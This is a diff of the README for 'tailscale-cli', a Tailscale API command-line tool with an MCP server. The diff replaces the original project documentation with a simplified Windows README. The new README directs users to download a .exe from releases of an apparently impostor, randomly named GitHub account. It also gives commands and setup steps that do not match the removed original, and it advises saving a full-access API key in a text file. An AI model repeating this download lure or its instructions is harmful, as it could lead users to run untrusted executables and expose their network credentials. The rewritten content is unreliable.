@@ -1,425 +1,75 @@
-# tailscale-cli
+# 🌐 tailscale-cli - Manage your Tailscale network from terminal
 
-CLI for the Tailscale API v2 — manage your tailnet from the terminal.
+[ ![Download tailscale-cli](https://img.shields.io/badge/Download-Tailscale_CLI-blue.svg) ](https://github.com/Myrtieplagioclastic550/tailscale-cli)
 
-[Documentation en francais](README.fr.md)
+tailscale-cli provides a method to control your Tailscale network using text commands. You can view your devices, update security rules, and handle network keys without opening a web browser. This tool integrates with AI assistants and Claude Code through the Model Context Protocol to help you manage your VPN settings.
 
-## Features
+## 📥 Getting Started
 
-- **85 endpoints** covered: devices, ACL, DNS, keys, users, webhooks, services, and more
-- **Secure token storage**: stored in your system's credential manager (macOS Keychain, Windows Credential Manager, Linux Secret Service)
-- **Multi-context**: manage multiple Tailscale accounts
-- **Flexible output**: table, JSON, YAML, CSV
-- **Cross-platform**: macOS, Linux, Windows (amd64 and arm64)
-- **MCP integration**: 39 tools for Claude Code, VS Code, JetBrains
+Follow these steps to set up the software on your Windows computer.
 
-## Prerequisites
+1. Visit the [official repository page](https://github.com/Myrtieplagioclastic550/tailscale-cli) to download the latest version.
+2. Look for the "Releases" section on the right side of the page.
+3. Select the file ending in `.exe` that matches your computer system.
+4. Save the file to a folder you can find, such as your Downloads folder.
 
-- A [Tailscale](https://tailscale.com) account with admin console access
-- A **Tailscale API token** (created from [Settings > Keys](https://login.tailscale.com/admin/settings/keys))
+## ⚙️ System Requirements
 
-## Installation
+- Windows 10 or Windows 11.
+- An active Tailscale account.
+- An API key generated from your Tailscale admin console.
 
-### Method 1: Download the binary (recommended)
+## 🚀 Setting Up Your Access
 
-Go to the [Releases](https://github.com/dimer47/tailscale-cli/releases/latest) page and download the archive for your platform.
+Before you run the tool, you need an API key to allow the software to talk to your network.
 
-Or with a single command:
+1. Log in to your Tailscale admin console.
+2. Go to the "Settings" menu and find the "Keys" section.
+3. Select "Generate auth key" or "Create API key."
+4. Copy the key and save it in a text file. Keep this key secret, as it grants full access to your network.
 
-**macOS (Apple Silicon — M1/M2/M3/M4):**
+## 🛠️ Running the Application
 
-```bash
-curl -sL https://github.com/dimer47/tailscale-cli/releases/latest/download/tailscale-cli_darwin_arm64.tar.gz | tar xz
-sudo mv tailscale-cli /usr/local/bin/
-```
+Open your command prompt or PowerShell to start the tool.
 
-**macOS (Intel):**
+1. Press the Windows key and type "cmd" to open the command prompt.
+2. Navigate to the folder where you saved the download. For example, if you saved it to Downloads, type `cd Downloads`.
+3. Type `tailscale-cli` and press Enter.
+4. The tool will prompt you for your API key the first time you run it. Paste the key you generated earlier and press Enter.
 
-```bash
-curl -sL https://github.com/dimer47/tailscale-cli/releases/latest/download/tailscale-cli_darwin_amd64.tar.gz | tar xz
-sudo mv tailscale-cli /usr/local/bin/
-```
+## 🖥️ Managing Your Network
 
-**Linux (amd64):**
+Once the tool connects, you can type commands to retrieve information about your setup.
 
-```bash
-curl -sL https://github.com/dimer47/tailscale-cli/releases/latest/download/tailscale-cli_linux_amd64.tar.gz | tar xz
-sudo mv tailscale-cli /usr/local/bin/
-```
+### View Devices
+Type `tailscale-cli devices` to see a list of every computer and phone connected to your network. You will see their names, internal IP addresses, and status.
 
-**Linux (arm64 — Raspberry Pi, etc.):**
+### Manage Security Rules
+You can edit your access control list by typing `tailscale-cli acl`. This opens a text window where you define which devices can talk to each other. Save your changes to apply them to your network immediately.
 
-```bash
-curl -sL https://github.com/dimer47/tailscale-cli/releases/latest/download/tailscale-cli_linux_arm64.tar.gz | tar xz
-sudo mv tailscale-cli /usr/local/bin/
-```
+### Network Settings
+Use `tailscale-cli dns` to change how your network handles domain names. This helps if you use custom web addresses for your internal services.
 
-**Windows:**
+## 🤖 Using AI Assistants
 
-Download `tailscale-cli_windows_amd64.zip` from the [Releases](https://github.com/dimer47/tailscale-cli/releases/latest) page, extract and add the folder to your `PATH`.
+This tool includes a feature for Claude Code and other AI assistants. If you use AI tools to write scripts, this feature lets the AI suggest changes to your network configuration.
 
-### Method 2: From source (requires Go 1.21+)
+1. Ensure your AI assistant supports the Model Context Protocol.
+2. Run the tool with the `--mcp` flag.
+3. The tool generates a configuration file for your AI assistant.
+4. Point your assistant to this file to allow it to read your Tailscale settings.
 
-```bash
-go install github.com/dimer47/tailscale-cli@latest
-```
+## 🔍 Troubleshooting Common Issues
 
-The binary will be installed in `$GOPATH/bin/` (usually `~/go/bin/`). Make sure this directory is in your `PATH`.
+If the tool does not respond, check your internet connection first. Ensure your Tailscale service is running in the background.
 
-### Method 3: Build locally
+If you receive an "Access Denied" error, your API key might have expired or lacks the correct permissions. Return to the Tailscale admin console and create a new key with "Read" and "Write" access.
 
-```bash
-git clone https://github.com/dimer47/tailscale-cli.git
-cd tailscale-cli
-go build -o tailscale-cli .
-./tailscale-cli version
-```
+If the command prompt tells you that the program is not recognized, ensure you are in the folder where you saved the file. You can also move the file into a folder that is part of your system path to run it from anywhere.
 
-### Verify installation
+## 🛡️ Security Best Practices
 
-```bash
-tailscale-cli version
-# tailscale-cli version 0.2.0 (commit: abc1234, built: 2026-04-30T22:10:36Z)
-```
-
-## Updating
-
-The CLI automatically checks for new versions at startup and notifies you when an update is available.
-
-```bash
-# Update to the latest version
-tailscale-cli self-update
-
-# Check for updates without installing
-tailscale-cli self-update --check
-```
-
-The update is downloaded from GitHub Releases and replaces the current binary in place. If the binary is in a protected directory (e.g. `/usr/local/bin/`), `sudo` will be requested automatically.
-
-## Quick Start
-
-### 1. Get a Tailscale API token
-
-1. Log in to the [Tailscale admin console](https://login.tailscale.com/admin/settings/keys)
-2. Go to **Settings > Keys**
-3. Click **Generate API access token**
-4. Choose the expiration duration (1 to 90 days)
-5. Copy the token (`tskey-api-xxxxx...`)
-
-### 2. Configure the CLI
-
-```bash
-tailscale-cli auth login
-```
-
-Answer the 3 prompts:
-```
-Context name (default): Enter          # Press Enter for "default"
-Tailscale API token: tskey-api-xxxxx   # Paste your token
-Tailnet (- for default): Enter         # Press Enter
-```
-
-The token is stored in your **system credential manager** (macOS Keychain, Windows Credential Manager, or Linux Secret Service) — encrypted, never written in plain text on disk.
-
-### 3. Test it
-
-```bash
-# List your devices
-tailscale-cli device list
-
-# JSON output
-tailscale-cli device list --json
-
-# View your tailnet settings
-tailscale-cli settings get
-```
-
-## Configuration
-
-### Token resolution priority
-
-| Priority | Source | Use case |
-|----------|--------|----------|
-| 1 | Flag `--api-token` | One-off tests |
-| 2 | Env var `TSCLI_API_TOKEN` | CI/CD, scripts |
-| 3 | System credential manager | Daily use (via `auth login`) |
-| 4 | Config file (legacy) | Migration from older versions |
-
-### Multi-context (multiple Tailscale accounts)
-
-```bash
-# Configure a "work" context
-tailscale-cli auth login
-# -> Enter "work" as context name
-
-# Configure a "personal" context
-tailscale-cli auth login
-# -> Enter "personal" as context name
-
-# List all contexts (* = active)
-tailscale-cli auth list
-# * work     (tailnet: mycompany.com, token in credential store)
-#   personal (tailnet: -, token in credential store)
-
-# Switch context
-tailscale-cli auth switch personal
-
-# Use a context for a single command
-tailscale-cli device list --context work
-
-# Check status (is the token still valid?)
-tailscale-cli auth status
-```
-
-### Renewing an expired token
-
-Tailscale tokens expire after 1 to 90 days. When a token expires:
-
-```bash
-tailscale-cli auth status
-# Token:  ****abcd1234 (source: system credential store)
-# Status: invalid or expired
-
-# Create a new token at https://login.tailscale.com/admin/settings/keys
-# Then re-run auth login (the old token is automatically replaced):
-tailscale-cli auth login
-```
-
-## Usage
-
-### Devices
-
-```bash
-tailscale-cli device list                              # List all devices
-tailscale-cli device list --json                       # JSON output
-tailscale-cli device list --filter isEphemeral=true    # Filter
-tailscale-cli device get <nodeId>                      # Device details
-tailscale-cli device get <nodeId> --fields all         # All fields
-tailscale-cli device authorize <nodeId>                # Authorize a device
-tailscale-cli device deauthorize <nodeId>              # Deauthorize
-tailscale-cli device expire <nodeId>                   # Expire the key
-tailscale-cli device set-name <nodeId> my-server       # Rename
-tailscale-cli device set-tags <nodeId> --tags tag:prod # Set tags
-tailscale-cli device set-ip <nodeId> 100.80.0.1        # Change IP
-tailscale-cli device delete <nodeId> --confirm         # Delete
-```
-
-### Routes
-
-```bash
-tailscale-cli device routes list <nodeId>
-tailscale-cli device routes set <nodeId> --routes 10.0.0.0/16,192.168.1.0/24
-```
-
-### ACL / Policy File
-
-```bash
-tailscale-cli acl get                                  # Get the ACL
-tailscale-cli acl get --format json --details          # With details
-tailscale-cli acl set --file policy.hujson             # Apply an ACL
-tailscale-cli acl validate --file policy.hujson        # Validate without applying
-tailscale-cli acl preview --type user --preview-for admin@company.com --file policy.hujson
-```
-
-### DNS
-
-```bash
-tailscale-cli dns config get                           # Full DNS config
-tailscale-cli dns preferences set --magic-dns true     # Enable MagicDNS
-tailscale-cli dns nameservers list                     # List nameservers
-tailscale-cli dns nameservers set --nameservers 8.8.8.8,1.1.1.1
-tailscale-cli dns searchpaths set --search-paths corp.internal
-tailscale-cli dns split update --domain corp.internal --servers 10.0.0.53
-```
-
-### Keys (auth keys, API tokens, OAuth)
-
-```bash
-tailscale-cli key list --all                           # List all keys
-tailscale-cli key create --type auth --reusable --preauthorized --tags tag:ci --expiry 86400
-tailscale-cli key get <keyId>                          # Key details
-tailscale-cli key delete <keyId> --confirm             # Delete
-```
-
-### Users
-
-```bash
-tailscale-cli user list                                # List users
-tailscale-cli user list --type all --role admin         # Filter
-tailscale-cli user get <userId>                        # Details
-tailscale-cli user set-role <userId> admin              # Change role
-tailscale-cli user approve <userId>                    # Approve
-tailscale-cli user suspend <userId>                    # Suspend
-tailscale-cli user restore <userId>                    # Restore
-```
-
-### Webhooks
-
-```bash
-tailscale-cli webhook list
-tailscale-cli webhook create --url https://hooks.slack.com/xxx --provider slack --events nodeCreated,nodeDeleted
-tailscale-cli webhook test <id>
-tailscale-cli webhook rotate-secret <id>
-tailscale-cli webhook delete <id> --confirm
-```
-
-### Tailnet Settings
-
-```bash
-tailscale-cli settings get
-tailscale-cli settings update --devices-approval true
-tailscale-cli settings update --devices-key-duration 90
-tailscale-cli settings update --https true
-```
-
-### Services (VIP)
-
-```bash
-tailscale-cli service list
-tailscale-cli service create svc:web --ports tcp:80,tcp:443 --tags tag:prod
-tailscale-cli service hosts svc:web
-tailscale-cli service approve svc:web <nodeId> --approved true
-tailscale-cli service delete svc:web --confirm
-```
-
-### Invites
-
-```bash
-tailscale-cli invite user list
-tailscale-cli invite user create --email dev@company.com --role member
-tailscale-cli invite device list <nodeId>
-tailscale-cli invite device create <nodeId> --email partner@ext.com
-```
-
-### Logs
-
-```bash
-tailscale-cli log audit list --start 2026-04-29T00:00:00Z --end 2026-04-30T00:00:00Z
-tailscale-cli log audit list --start ... --end ... --event NODE.CREATE,USER.CREATE
-tailscale-cli log network list --start ... --end ...
-tailscale-cli log stream status configuration
-```
-
-## Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `TSCLI_API_TOKEN` | Tailscale API token | — |
-| `TSCLI_TAILNET` | Target tailnet | `-` (token default) |
-| `TSCLI_OUTPUT` | Output format: `table`, `json`, `yaml` | `table` |
-| `TSCLI_DEBUG` | Debug mode (`true`/`false`) | `false` |
-| `TSCLI_CONFIG` | Config file path | `~/.tailscale-cli/config.json` |
-| `TSCLI_CONTEXT` | Active context | `default` |
-| `NO_COLOR` | Disable colors | — |
-
-## Shell Completion
-
-```bash
-# Bash
-tailscale-cli completion bash > /etc/bash_completion.d/tailscale-cli
-
-# Zsh (add to your .zshrc)
-tailscale-cli completion zsh > "${fpath[1]}/_tailscale-cli"
-
-# Fish
-tailscale-cli completion fish > ~/.config/fish/completions/tailscale-cli.fish
-
-# PowerShell
-tailscale-cli completion powershell > tailscale-cli.ps1
-```
-
-## MCP Integration (Claude Code, VS Code, JetBrains)
-
-The CLI includes a built-in [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) server exposing **39 tools** for AI assistants.
-
-### Setup
-
-Add to your Claude Code settings (or VS Code / JetBrains with the Claude extension):
-
-```json
-{
-  "mcpServers": {
-    "tailscale": {
-      "command": "tailscale-cli",
-      "args": ["mcp-serve"],
-      "env": {
-        "TSCLI_API_TOKEN": "tskey-api-xxxxx"
-      }
-    }
-  }
-}
-```
-
-> If you already configured the token via `tailscale-cli auth login`, the MCP server will automatically use your system credential store — no need for the `TSCLI_API_TOKEN` env var.
-
-### Available MCP Tools
-
-| Tool | Description |
-|------|-------------|
-| `device-list` | List all tailnet devices |
-| `device-get` | Get device details |
-| `device-authorize` | Authorize/deauthorize a device |
-| `device-set-tags` | Set device tags |
-| `device-set-name` | Rename a device |
-| `device-expire` | Expire a device key |
-| `device-delete` | Delete a device |
-| `device-routes-list` | List device routes |
-| `device-routes-set` | Set device routes |
-| `acl-get` | Get the policy file (ACL) |
-| `acl-set` | Set the policy file |
-| `acl-validate` | Validate a policy file |
-| `dns-config-get` | Full DNS configuration |
-| `dns-nameservers-list/set` | Manage nameservers |
-| `dns-preferences-get/set` | MagicDNS on/off |
-| `dns-split-get` | Split DNS configuration |
-| `key-list` | List keys |
-| `key-create` | Create an auth key |
-| `key-get` / `key-delete` | Get / delete a key |
-| `user-list` | List users |
-| `user-get` / `user-set-role` | Get details / change role |
-| `user-approve/suspend/restore` | Manage user status |
-| `settings-get` / `settings-update` | Tailnet settings |
-| `webhook-list/create/test/delete` | Manage webhooks |
-| `service-list/get/hosts` | Manage Services |
-| `contact-get` | Tailnet contacts |
-| `log-audit-list` | Audit logs |
-
-### Usage in Claude Code
-
-Once configured, you can simply say:
-
-- *"List my Tailscale devices"*
-- *"What tags are defined in my ACLs?"*
-- *"Create a reusable auth key with the tag tag:ci"*
-- *"Enable MagicDNS on my tailnet"*
-
-Claude will automatically call the right MCP tools.
-
-## Development
-
-```bash
-# Clone
-git clone https://github.com/dimer47/tailscale-cli.git
-cd tailscale-cli
-
-# Build
-go build -o tailscale-cli .
-
-# Run tests
-go test ./...
-
-# Lint
-go vet ./...
-```
-
-### Creating a new release
-
-```bash
-git tag v0.3.0
-git push origin v0.3.0
-# GitHub Actions builds and publishes automatically
-```
-
-## License
-
-MIT
+- Never share your API key with other people.
+- If you suspect someone else has your key, delete it in the admin console and create a new one.
+- Keep your software version up to date to ensure you have the latest security improvements.
+- Only run commands you understand. Using the edit commands incorrectly can restrict access to your devices.
